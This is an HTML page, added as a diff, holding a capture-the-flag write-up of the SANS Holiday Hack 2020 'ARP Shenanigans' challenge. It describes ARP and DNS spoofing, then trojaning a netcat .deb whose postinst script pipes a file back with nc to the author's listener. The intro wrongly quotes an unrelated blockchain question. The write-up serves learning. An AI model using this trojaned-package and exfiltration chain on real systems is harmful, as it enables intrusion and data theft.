@@ -1,0 +1,164 @@
+<html>
+<head>
+    <link rel="stylesheet" href="./css/style.css">
+    <title>Naughty/Nice List with Blockchain Investigation - Pt1: SANS Holiday Hack 2020</title>
+    <script type="text/javascript" src="./scripts/chars.js"></script>
+</head>
+<body>
+<div class="content-surround main-centered">
+    <div class="content-background">
+        <div id="mainContent" class="content-body">
+            <div class="content">
+                <!--
+                Common - v2020.DEC.23
+                -->
+
+
+
+                <div class="title">Naughty/Nice List with Blockchain Investigation - Pt1: SHHC20</div>
+                <div class="writeup">
+                    <div class="polaroid-rotate-right">
+                        <div class="polaroid-surround">
+                            <div class="polaroid-frame" onclick="OpenImgModal('blockchain')">
+                                <div class="polaroid-caption">ARP Shenanigans</div>
+                            </div>
+                            <div class="polaroid-img-bg"><div id="arp_shenanigans" class="polaroid-img" style="background-image: url('./screenshots/arp_shenanigans.png');">&nbsp;</div></div>
+                        </div>
+                    </div>
+                    <p>In the <a href="./netwars.html" class="link">NetWars</a> roof beside <span class="char" onclick="OpenCharModal('alabaster_snowball')">Alabaster Snowball</span> is a terminal titled ARP Shenanigans.</p>
+                    <p>Talking with Alabster, he states we need to do a man-in-the-middle attack on a host compromised by Jack Frost and read the contents of a file on the file system.</p>
+                    <p>The SHA256 of Jack's altered block is: 58a3b9335a6ceb0234c12d35a0564c4e f0e90152d0eb2ce2082383b38028a90f. If you're clever, you can recreate the original version of that block by changing the values of only 4 bytes.
+                        Once you've recreated the original block, what is the SHA256 of that block?</p>
+                </div>
+                <div class="writeup">
+                    <div class="polaroid-rotate">
+                        <div class="polaroid-surround">
+                            <div class="polaroid-frame" onclick="OpenImgModal('arp_shenanigans_1')">
+                                <div class="polaroid-caption">Setup</div>
+                            </div>
+                            <div class="polaroid-img-bg"><div id="arp_shenanigans_1" class="polaroid-img" style="background-image: url('./screenshots/arp_shenanigans_1.png');">&nbsp;</div></div>
+                        </div>
+                    </div>
+                </div>
+                <div class="writeup">
+                    <p>Doing a quick tcpdump with <span class="cmd cmd-sur">tcpdump -nne -vv</span> shows the host 10.6.6.35 repeatedly doing an arp call for 10.6.6.53.</p>
+                    <div class="polaroid-rotate-right">
+                        <div class="polaroid-surround">
+                            <div class="polaroid-frame" onclick="OpenImgModal('arp_shenanigans_2')">
+                                <div class="polaroid-caption">Who dat?</div>
+                            </div>
+                            <div class="polaroid-img-bg"><div id="arp_shenanigans_2" class="polaroid-img" style="background-image: url('./screenshots/arp_shenanigans_2.png');">&nbsp;</div></div>
+                        </div>
+                    </div>
+                    <p>Looking in <span class="question cmd-sur">~/scripts</span> shows python scripts for spoofing ARP (<span class="question cmd-sur">~/scripts/arp_resp.py</span>) and spoofing a DNS query response (<span class="question cmd-sur">~/scripts/dns_resp.py</span>).</p>
+                    <p>First order of business is modifying these scripts with appropriate values so that they correctly spoof the ARP and DNS query.</p>
+                    <p>After a bit of trial and error, the revised scripts posted here: <a href="./arp_resp.py">arp_resp.py</a> and <a href="./dns_resp.py">dns_resp.py</a></p>
+                </div>
+                <div class="writeup">
+                    <div class="polaroid-rotate">
+                        <div class="polaroid-surround">
+                            <div class="polaroid-frame" onclick="OpenImgModal('arp_shenanigans_3')">
+                                <div class="polaroid-caption">Gimme the File</div>
+                            </div>
+                            <div class="polaroid-img-bg"><div id="arp_shenanigans_3" class="polaroid-img" style="background-image: url('./screenshots/arp_shenanigans_3.png');">&nbsp;</div></div>
+                        </div>
+                    </div>
+                    <p>The help mentions using python to run a webserver, so I fired that up next using <span class="cmd cmd-sur">python3 -m http.server 80</span>.</p>
+                    <p>This showed the remote host repeatedly trying to download the file <span class="question cmd-sur">/pub/jfrost/backdoor/suriv_amd64.deb</span>.</p>
+                    <p>The directory <span class="question cmd-sur">~/debs</span> has multiple debian packages, including netcat.  What if we modified this package to open a netcat connection after install and pipe the file back to a listening netcat on our side?</p>
+                </div>
+                <div class="writeup">
+                    <div class="polaroid-rotate-right">
+                        <div class="polaroid-surround">
+                            <div class="polaroid-frame" onclick="OpenImgModal('arp_shenanigans_4')">
+                                <div class="polaroid-caption">New Package</div>
+                            </div>
+                            <div class="polaroid-img-bg"><div id="arp_shenanigans_4" class="polaroid-img" style="background-image: url('./screenshots/arp_shenanigans_4.png');">&nbsp;</div></div>
+                        </div>
+                    </div>
+                    <p>First I created a directory for the extracted package by running <span class="cmd cmd-sur">mkdir -p ~/debs/netcat</span>.</p>
+                    <p>I then extracted the netcat package to the new dir by running <span class="cmd cmd-sur">dpkg-deb -R ~/debs/netcat-traditional_1.10-41.1ubuntu1_amd64.deb ~/debs/netcat</span>.</p>
+                    <p>To the postinst script I added commands to cat the requested file to a netcat back to this server by running <span class="cmd cmd-sur">cat << EOF >> ~/debs/netcat/DEBIAN/postinst<br>
+cat /NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt | nc `hostname -I` 4444<br>
+EOF</span></p>
+                    <p>I then rebuilt the package into the file that the remote host is trying to download with <span class="cmd cmd-sur">dpkg-deb -b ~/debs/netcat ~/debs/suriv_amd64.deb</span>.</p>
+                    <p>To cover the path requested for the file, I created some subdirs and a sym link with <span class="cmd cmd-sur">mkdir -p ~/pub/jfrost<br>ln -s ~/debs ~/pub/jfrost/backdoor</span>.</p>
+                    <p>I then started up the HTTP server with <span class="cmd cmd-sur">python3 -m http.server 80</span>.</p>
+                    <p>In a different tmux pane, I started up netcat listening on a port with redirecting any output to a file using <span class="cmd cmd-sur">nc -lvp 4444 > ~/NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt</span></p>
+                </div>
+
+                <div class="writeup">
+                    <div class="polaroid-rotate">
+                        <div class="polaroid-surround">
+                            <div class="polaroid-frame" onclick="OpenImgModal('arp_shenanigans_5')">
+                                <div class="polaroid-caption">Start the Sequence</div>
+                            </div>
+                            <div class="polaroid-img-bg"><div id="arp_shenanigans_5" class="polaroid-img" style="background-image: url('./screenshots/arp_shenanigans_5.png');">&nbsp;</div></div>
+                        </div>
+                    </div>
+                    <p>In another pane I then started the <span class="question cmd-sur">arp_resp.py</span> and <span class="question cmd-sur">dns_resp.py</span> scripts in an infinite loop.</p>
+                    <p>The chain began.  The arp request was spoofed, then the dns request.  The remote host connected to the web server and downloaded the file.  During the post install, the package made a connection back to this host and cat the file.</p>
+
+                </div>
+
+                <div class="writeup">
+                    <div class="polaroid-rotate-right">
+                        <div class="polaroid-surround">
+                            <div class="polaroid-frame" onclick="OpenImgModal('arp_shenanigans_6')">
+                                <div class="polaroid-caption">Who Recuse</div>
+                            </div>
+                            <div class="polaroid-img-bg"><div id="arp_shenanigans_6" class="polaroid-img" style="background-image: url('./screenshots/arp_shenanigans_6.png');">&nbsp;</div></div>
+                        </div>
+                    </div>
+                    <p>Reading the file that was collected shows who recused themselves in the vote..</p>
+
+                </div>
+                <div class="objective_flag">Tanta Kringle</div>
+
+                <div class="writeup">
+                    <p>An overview of all people, places, and events can be learned in the <a href="./index.html" class="link">Introduction</a>.</p>
+                </div>
+
+
+
+
+
+                <!--
+                Common - v2020.DEC.23
+                -->
+            </div>
+            <div class="footer" style="">
+                <span class="footer-text">
+                    <a href="./index.html">Find Other Scrolls</a> | <a href="mailto:jeremy@uranusbytes.com">jeremy@uranusbytes.com</a> | <a href="./credits.html">Credits</a>
+                </span>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div id="ImgModalDiv" class="modal2">
+    <span id="ImgModalClose" class="modal-close" onclick="CloseImgModal();">&times;</span>
+    <div class="polaroid-big-rotate">
+        <div class="polaroid-big-surround">
+            <img id="ModalImg" src="./images/blank.png" class="polaroid-big" />
+        </div>
+    </div>
+</div>
+
+
+<div id="CharModalDiv" class="modal">
+    <span id="CharModalClose" class="modal-close" onclick="CloseCharModal();">&times;</span>
+    <div class="char-container">
+        <div class="char-child" style="flex-grow: 1; overflow: hidden;">
+            <div id="CharName" class="char-name">Jingle</div>
+            <img id="CharAvatar" class="char-avatar" src="./images/blank.png">
+        </div>
+        <div class="char-child" style="flex-grow: 1;">
+            <div class="char-name">Dialog</div>
+            <div id="CharDialog" class="char-dialog"></div>
+        </div>
+    </div>
+</div>
+
+</body>
+</html>
